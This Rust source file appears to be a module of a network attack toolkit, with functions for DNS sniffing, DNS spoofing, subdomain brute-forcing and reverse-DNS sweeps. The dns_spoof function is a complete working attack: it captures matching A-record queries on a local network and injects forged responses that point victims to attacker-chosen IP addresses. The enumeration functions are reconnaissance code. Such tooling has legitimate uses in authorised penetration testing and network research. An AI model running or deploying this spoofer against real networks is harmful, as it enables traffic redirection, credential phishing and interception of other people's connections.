use anyhow::{anyhow, Result};
use pnet::datalink::{self, Channel, NetworkInterface};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{Ipv4Packet, MutableIpv4Packet};
use pnet::packet::udp::{MutableUdpPacket, UdpPacket};
use pnet::packet::Packet;
use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;

// ── DNS wire helpers ──────────────────────────────────────────────

fn decode_dns_name(buf: &[u8], mut pos: usize) -> Option<(String, usize)> {
    let mut parts = Vec::new();
    let mut jumped = false;
    let mut end_pos = 0;
    loop {
        if pos >= buf.len() {
            return None;
        }
        let len = buf[pos] as usize;
        if len == 0 {
            if !jumped {
                end_pos = pos + 1;
            }
            break;
        }
        if len & 0xC0 == 0xC0 {
            if pos + 1 >= buf.len() {
                return None;
            }
            let ptr = ((len & 0x3F) << 8) | buf[pos + 1] as usize;
            if !jumped {
                end_pos = pos + 2;
                jumped = true;
            }
            pos = ptr;
            continue;
        }
        pos += 1;
        if pos + len > buf.len() {
            return None;
        }
        parts.push(String::from_utf8_lossy(&buf[pos..pos + len]).to_string());
        pos += len;
    }
    if parts.is_empty() {
        return None;
    }
    Some((parts.join("."), end_pos))
}

#[allow(dead_code)]
fn encode_dns_name(name: &str) -> Vec<u8> {
    let mut out = Vec::new();
    for part in name.split('.') {
        out.push(part.len() as u8);
        out.extend_from_slice(part.as_bytes());
    }
    out.push(0);
    out
}

struct DnsQuestion {
    name: String,
    qtype: u16,
    qclass: u16,
    end_pos: usize,
}

fn parse_dns_question(buf: &[u8]) -> Option<DnsQuestion> {
    if buf.len() < 12 {
        return None;
    }
    let (name, pos) = decode_dns_name(buf, 12)?;
    if pos + 4 > buf.len() {
        return None;
    }
    let qtype = u16::from_be_bytes([buf[pos], buf[pos + 1]]);
    let qclass = u16::from_be_bytes([buf[pos + 2], buf[pos + 3]]);
    Some(DnsQuestion {
        name,
        qtype,
        qclass,
        end_pos: pos + 4,
    })
}

fn dns_type_str(t: u16) -> &'static str {
    match t {
        1 => "A",
        2 => "NS",
        5 => "CNAME",
        6 => "SOA",
        12 => "PTR",
        15 => "MX",
        16 => "TXT",
        28 => "AAAA",
        33 => "SRV",
        255 => "ANY",
        _ => "?",
    }
}

/// Build a forged DNS response packet (DNS layer only).
fn build_dns_response(query: &[u8], question: &DnsQuestion, spoof_ip: Ipv4Addr, ttl: u32) -> Vec<u8> {
    let id = &query[..2];
    let mut resp = Vec::with_capacity(question.end_pos + 16);
    // Header
    resp.extend_from_slice(id);
    resp.extend_from_slice(&[0x81, 0x80]); // QR=1, AA=1, RD=1, RA=1
    resp.extend_from_slice(&[0x00, 0x01]); // QDCOUNT=1
    resp.extend_from_slice(&[0x00, 0x01]); // ANCOUNT=1
    resp.extend_from_slice(&[0x00, 0x00]); // NSCOUNT=0
    resp.extend_from_slice(&[0x00, 0x00]); // ARCOUNT=0
    // Question section (copy from query)
    resp.extend_from_slice(&query[12..question.end_pos]);
    // Answer: pointer to name in question + A record
    resp.extend_from_slice(&[0xC0, 0x0C]); // name pointer to offset 12
    resp.extend_from_slice(&1u16.to_be_bytes()); // TYPE A
    resp.extend_from_slice(&1u16.to_be_bytes()); // CLASS IN
    resp.extend_from_slice(&ttl.to_be_bytes()); // TTL
    resp.extend_from_slice(&4u16.to_be_bytes()); // RDLENGTH
    resp.extend_from_slice(&spoof_ip.octets()); // RDATA
    resp
}

// ── Interface selection ───────────────────────────────────────────

fn select_interface(name: Option<&str>) -> Result<NetworkInterface> {
    let interfaces = datalink::interfaces();
    if let Some(n) = name {
        interfaces
            .into_iter()
            .find(|i| i.name == n || i.description == n)
            .ok_or_else(|| anyhow!("interface '{}' not found", n))
    } else {
        interfaces
            .into_iter()
            .find(|i| i.is_up() && !i.is_loopback() && !i.ips.is_empty())
            .ok_or_else(|| anyhow!("no suitable network interface found. Use --iface to specify one."))
    }
}

// ── DNS Sniff ─────────────────────────────────────────────────────

pub fn dns_sniff(iface_name: Option<&str>, cancel: Arc<AtomicBool>) -> Result<()> {
    let iface = select_interface(iface_name)?;
    eprintln!("[dns-sniff] listening on {} ...", iface.name);
    let (_, mut rx) = match datalink::channel(&iface, Default::default())? {
        Channel::Ethernet(tx, rx) => (tx, rx),
        _ => return Err(anyhow!("unsupported channel type")),
    };
    while !cancel.load(Ordering::Relaxed) {
        match rx.next() {
            Ok(pkt) => {
                if let Some(eth) = EthernetPacket::new(pkt) {
                    if eth.get_ethertype() != EtherTypes::Ipv4 {
                        continue;
                    }
                    if let Some(ipv4) = Ipv4Packet::new(eth.payload()) {
                        if ipv4.get_next_level_protocol() != IpNextHeaderProtocols::Udp {
                            continue;
                        }
                        if let Some(udp) = UdpPacket::new(ipv4.payload()) {
                            let is_query = udp.get_destination() == 53;
                            let is_response = udp.get_source() == 53;
                            if !is_query && !is_response {
                                continue;
                            }
                            let dns_data = udp.payload();
                            if let Some(q) = parse_dns_question(dns_data) {
                                let dir = if is_query { "Q" } else { "R" };
                                let src = ipv4.get_source();
                                let dst = ipv4.get_destination();
                                println!(
                                    "[{}] {} -> {} : {} {} (class {})",
                                    dir,
                                    src,
                                    dst,
                                    dns_type_str(q.qtype),
                                    q.name,
                                    q.qclass
                                );
                            }
                        }
                    }
                }
            }
            Err(e) => {
                if cancel.load(Ordering::Relaxed) {
                    break;
                }
                eprintln!("[dns-sniff] rx error: {}", e);
                std::thread::sleep(std::time::Duration::from_millis(100));
            }
        }
    }
    Ok(())
}

// ── DNS Spoof ─────────────────────────────────────────────────────

pub fn dns_spoof(
    iface_name: Option<&str>,
    rules: &HashMap<String, Ipv4Addr>,
    ttl: u32,
    cancel: Arc<AtomicBool>,
) -> Result<()> {
    let iface = select_interface(iface_name)?;
    eprintln!("[dns-spoof] active on {}, {} rule(s):", iface.name, rules.len());
    for (domain, ip) in rules {
        eprintln!("  {} -> {}", domain, ip);
    }

    let (mut tx, mut rx) = match datalink::channel(&iface, Default::default())? {
        Channel::Ethernet(tx, rx) => (tx, rx),
        _ => return Err(anyhow!("unsupported channel type")),
    };

    while !cancel.load(Ordering::Relaxed) {
        let pkt = match rx.next() {
            Ok(p) => p.to_vec(),
            Err(_) => {
                if cancel.load(Ordering::Relaxed) {
                    break;
                }
                std::thread::sleep(std::time::Duration::from_millis(50));
                continue;
            }
        };

        let eth = match EthernetPacket::new(&pkt) {
            Some(e) => e,
            None => continue,
        };
        if eth.get_ethertype() != EtherTypes::Ipv4 {
            continue;
        }
        let ipv4 = match Ipv4Packet::new(eth.payload()) {
            Some(i) => i,
            None => continue,
        };
        if ipv4.get_next_level_protocol() != IpNextHeaderProtocols::Udp {
            continue;
        }
        let udp = match UdpPacket::new(ipv4.payload()) {
            Some(u) => u,
            None => continue,
        };
        if udp.get_destination() != 53 {
            continue;
        }
        let dns_data = udp.payload();
        let question = match parse_dns_question(dns_data) {
            Some(q) => q,
            None => continue,
        };
        // Only spoof A queries
        if question.qtype != 1 {
            continue;
        }
        let name_lower = question.name.to_lowercase();
        let spoof_ip = rules.iter().find_map(|(pattern, ip)| {
            if name_lower == *pattern || name_lower.ends_with(&format!(".{}", pattern)) {
                Some(*ip)
            } else {
                None
            }
        });
        let spoof_ip = match spoof_ip {
            Some(ip) => ip,
            None => continue,
        };

        println!(
            "[SPOOF] {} -> {} (was {}->{}, txid {:02x}{:02x})",
            question.name,
            spoof_ip,
            ipv4.get_source(),
            ipv4.get_destination(),
            dns_data[0],
            dns_data[1]
        );

        // Build spoofed DNS response
        let dns_resp = build_dns_response(dns_data, &question, spoof_ip, ttl);

        // Build UDP packet
        let udp_len = 8 + dns_resp.len();
        let mut udp_buf = vec![0u8; udp_len];
        {
            let mut udp_pkt = MutableUdpPacket::new(&mut udp_buf).unwrap();
            udp_pkt.set_source(53);
            udp_pkt.set_destination(udp.get_source());
            udp_pkt.set_length(udp_len as u16);
            udp_pkt.set_payload(&dns_resp);
            // Checksum optional for IPv4 UDP
            udp_pkt.set_checksum(0);
        }

        // Build IPv4 packet
        let ip_total = 20 + udp_buf.len();
        let mut ip_buf = vec![0u8; ip_total];
        {
            let mut ip_pkt = MutableIpv4Packet::new(&mut ip_buf).unwrap();
            ip_pkt.set_version(4);
            ip_pkt.set_header_length(5);
            ip_pkt.set_total_length(ip_total as u16);
            ip_pkt.set_identification(rand::random());
            ip_pkt.set_flags(0x02); // DF
            ip_pkt.set_ttl(64);
            ip_pkt.set_next_level_protocol(IpNextHeaderProtocols::Udp);
            ip_pkt.set_source(ipv4.get_destination());
            ip_pkt.set_destination(ipv4.get_source());
            ip_pkt.set_payload(&udp_buf);
            let cs = pnet::packet::ipv4::checksum(&ip_pkt.to_immutable());
            ip_pkt.set_checksum(cs);
        }

        // Build Ethernet frame
        let eth_len = 14 + ip_buf.len();
        let mut eth_buf = vec![0u8; eth_len];
        {
            let mut eth_pkt = MutableEthernetPacket::new(&mut eth_buf).unwrap();
            eth_pkt.set_destination(eth.get_source());
            eth_pkt.set_source(eth.get_destination());
            eth_pkt.set_ethertype(EtherTypes::Ipv4);
            eth_pkt.set_payload(&ip_buf);
        }

        match tx.send_to(&eth_buf, None) {
            Some(Ok(())) => {}
            Some(Err(e)) => eprintln!("[dns-spoof] send error: {}", e),
            None => eprintln!("[dns-spoof] send failed: no result"),
        }
    }

    eprintln!("[dns-spoof] stopped.");
    Ok(())
}

// ── DNS Enum (subdomain brute-force) ──────────────────────────────

const DEFAULT_WORDLIST: &[&str] = &[
    "www", "mail", "ftp", "smtp", "pop", "imap", "ns1", "ns2", "dns", "mx",
    "webmail", "vpn", "remote", "api", "dev", "staging", "test", "admin",
    "portal", "blog", "shop", "store", "cdn", "media", "static", "app",
    "login", "sso", "auth", "gateway", "proxy", "lb", "db", "sql", "mysql",
    "postgres", "redis", "mongo", "elastic", "kibana", "grafana", "jenkins",
    "ci", "cd", "git", "gitlab", "github", "bitbucket", "jira", "confluence",
    "wiki", "docs", "help", "support", "status", "monitor", "nagios", "zabbix",
    "prometheus", "vault", "k8s", "kube", "docker", "registry", "internal",
    "intranet", "extranet", "owa", "exchange", "autodiscover", "cpanel", "whm",
    "plesk", "backup", "cloud", "s3", "storage", "files", "upload", "download",
    "m", "mobile", "wap", "beta", "alpha", "staging2", "qa", "uat", "prod",
    "www2", "www3", "old", "new", "legacy", "v2", "api2", "rest", "graphql",
    "ws", "wss", "socket", "rtmp", "stream", "video", "img", "images", "assets",
];

fn random_label() -> String {
    use rand::distributions::{Alphanumeric, DistString};
    Alphanumeric
        .sample_string(&mut rand::thread_rng(), 12)
        .to_lowercase()
}

pub struct DnsEnumReport {
    pub base_a: Vec<std::net::Ipv4Addr>,
    pub base_aaaa: Vec<std::net::Ipv6Addr>,
    pub ns: Vec<String>,
    pub mx: Vec<String>,
    pub txt: Vec<String>,
    pub soa: Option<String>,
    pub wildcard_ips: std::collections::HashSet<std::net::IpAddr>,
    pub subdomains: Vec<(String, Vec<std::net::IpAddr>)>,
}

pub async fn dns_enum(
    domain: &str,
    wordlist: Option<&str>,
    parallel: usize,
    cancel: Arc<AtomicBool>,
) -> Result<DnsEnumReport> {
    use futures::stream::{self, StreamExt};
    use std::collections::HashSet;
    use trust_dns_resolver::TokioAsyncResolver;

    let resolver = TokioAsyncResolver::tokio_from_system_conf()?;
    let words: Vec<String> = if let Some(path) = wordlist {
        std::fs::read_to_string(path)?
            .lines()
            .map(|l| l.trim().to_lowercase())
            .filter(|l| !l.is_empty() && !l.starts_with('#'))
            .collect()
    } else {
        DEFAULT_WORDLIST.iter().map(|s| s.to_string()).collect()
    };

    // ── Base domain records ────────────────────────────────
    let base_a: Vec<std::net::Ipv4Addr> = resolver
        .ipv4_lookup(domain)
        .await
        .map(|l| l.iter().map(|r| r.0).collect())
        .unwrap_or_default();
    let base_aaaa: Vec<std::net::Ipv6Addr> = resolver
        .ipv6_lookup(domain)
        .await
        .map(|l| l.iter().map(|r| r.0).collect())
        .unwrap_or_default();

    let ns: Vec<String> = resolver
        .ns_lookup(domain)
        .await
        .map(|l| l.iter().map(|n| n.to_string().trim_end_matches('.').to_string()).collect())
        .unwrap_or_default();

    let mx: Vec<String> = resolver
        .mx_lookup(domain)
        .await
        .map(|l| {
            l.iter()
                .map(|m| format!("{} {}", m.preference(), m.exchange().to_string().trim_end_matches('.')))
                .collect()
        })
        .unwrap_or_default();

    let txt: Vec<String> = resolver
        .txt_lookup(domain)
        .await
        .map(|l| l.iter().map(|t| t.to_string()).collect())
        .unwrap_or_default();

    let soa: Option<String> = resolver
        .soa_lookup(domain)
        .await
        .ok()
        .and_then(|l| l.iter().next().map(|r| {
            format!(
                "{} {} serial={}",
                r.mname().to_string().trim_end_matches('.'),
                r.rname().to_string().trim_end_matches('.'),
                r.serial()
            )
        }));

    // ── Wildcard detection ─────────────────────────────────
    let mut wildcard_ips: HashSet<std::net::IpAddr> = HashSet::new();
    for _ in 0..3 {
        let fqdn = format!("{}.{}", random_label(), domain);
        if let Ok(lookup) = resolver.lookup_ip(fqdn.as_str()).await {
            for ip in lookup.iter() {
                wildcard_ips.insert(ip);
            }
        }
    }
    if !wildcard_ips.is_empty() {
        eprintln!(
            "[dns-enum] wildcard detected: {} IP(s) will be filtered",
            wildcard_ips.len()
        );
    }

    eprintln!(
        "[dns-enum] bruteforcing {} subdomains of {} (parallel: {})",
        words.len(),
        domain,
        parallel
    );

    let wc_arc = Arc::new(wildcard_ips.clone());

    let results: Vec<Option<(String, Vec<std::net::IpAddr>)>> = stream::iter(words.into_iter())
        .map(|sub| {
            let resolver = resolver.clone();
            let domain = domain.to_string();
            let cancel = Arc::clone(&cancel);
            let wc = Arc::clone(&wc_arc);
            async move {
                if cancel.load(Ordering::Relaxed) {
                    return None;
                }
                let fqdn = format!("{}.{}", sub, domain);
                match resolver.lookup_ip(fqdn.as_str()).await {
                    Ok(lookup) => {
                        let ips: Vec<std::net::IpAddr> =
                            lookup.iter().filter(|ip| !wc.contains(ip)).collect();
                        if !ips.is_empty() {
                            Some((fqdn, ips))
                        } else {
                            None
                        }
                    }
                    Err(_) => None,
                }
            }
        })
        .buffer_unordered(parallel)
        .collect()
        .await;

    let mut subdomains: Vec<(String, Vec<std::net::IpAddr>)> =
        results.into_iter().flatten().collect();
    subdomains.sort_by(|a, b| a.0.cmp(&b.0));

    Ok(DnsEnumReport {
        base_a,
        base_aaaa,
        ns,
        mx,
        txt,
        soa,
        wildcard_ips,
        subdomains,
    })
}

// ── Reverse DNS sweep ───────────────────────────────────────────

pub async fn dns_reverse(
    cidr: &str,
    parallel: usize,
    cancel: Arc<AtomicBool>,
) -> Result<Vec<(std::net::IpAddr, String)>> {
    use futures::stream::{self, StreamExt};
    use ipnet::IpNet;
    use trust_dns_resolver::TokioAsyncResolver;

    let net: IpNet = cidr.parse().map_err(|e| anyhow!("invalid CIDR '{}': {}", cidr, e))?;
    let resolver = TokioAsyncResolver::tokio_from_system_conf()?;

    let ips: Vec<std::net::IpAddr> = net.hosts().collect();
    eprintln!("[dns-reverse] scanning {} host(s) in {}", ips.len(), cidr);

    let results: Vec<Option<(std::net::IpAddr, String)>> = stream::iter(ips.into_iter())
        .map(|ip| {
            let resolver = resolver.clone();
            let cancel = Arc::clone(&cancel);
            async move {
                if cancel.load(Ordering::Relaxed) {
                    return None;
                }
                match resolver.reverse_lookup(ip).await {
                    Ok(rev) => rev
                        .iter()
                        .next()
                        .map(|n| (ip, n.to_string().trim_end_matches('.').to_string())),
                    Err(_) => None,
                }
            }
        })
        .buffer_unordered(parallel)
        .collect()
        .await;

    let mut found: Vec<(std::net::IpAddr, String)> = results.into_iter().flatten().collect();
    found.sort_by_key(|(ip, _)| ip.to_string());
    Ok(found)
}
